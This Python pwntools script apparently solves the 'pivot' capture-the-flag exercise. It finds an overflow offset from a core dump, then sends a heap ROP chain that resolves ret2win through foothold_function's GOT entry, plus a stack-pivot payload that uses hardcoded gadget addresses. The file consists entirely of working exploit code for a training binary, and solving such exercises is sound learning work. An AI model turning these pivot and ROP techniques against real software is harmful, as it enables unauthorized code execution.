#!/usr/bin/env python3
from pwn import *

# set up context
elf = context.binary = ELF('pivot')
context.log_level = 'debug'
context.terminal = ('tmux', 'new-window')

# find offset
io = process(elf.path)
io.sendline(cyclic(10))
io.sendline(cyclic(128))
io.wait()
core = io.corefile
stack = core.rsp
offset = core.read(stack, 4)

# craft payload
def build_stack_payload(heap_addr: int) -> bytes:
    return flat(
        { offset : 0x00000000004009bb }, # pop rax; ret
        heap_addr,          # we need to pivot to the heap chain

        0x00000000004009bd, # xchg rsp,rax; ret
    )

# dbg_stack_payload = flat(
#     { offset : elf.symbols.foothold_function }
# )

def build_heap_payload() -> bytes:
    return flat(
        elf.symbols.foothold_function, # must be on heap, this fails on stack
        0x00000000004009bb, # pop rax; ret; 
        0x601040,           # foothold_function@got.plt

        0x00000000004009c0, # mov rax, qword ptr [rax]; ret; 

        0x00000000004007c8, # pop rbp; ret; 
        279,                # ret2win - foothold_function at runtime

        0x00000000004009c4, # add rax, rbp; ret; 

        0x00000000004006b0, # call rax; 
    )

# send payload
io = process(elf.path)
io.recvuntil(b'a place to pivot: ')
heap_addr = int(io.recvline().decode('ascii').rstrip(), base=16)

io.recvuntil(b'> ')
io.sendline(build_heap_payload())
io.recvuntil(b'> ')
io.sendline(build_stack_payload(heap_addr))

io.recvuntil(b'libpivot\n')
print(io.recvline().decode('utf-8'))
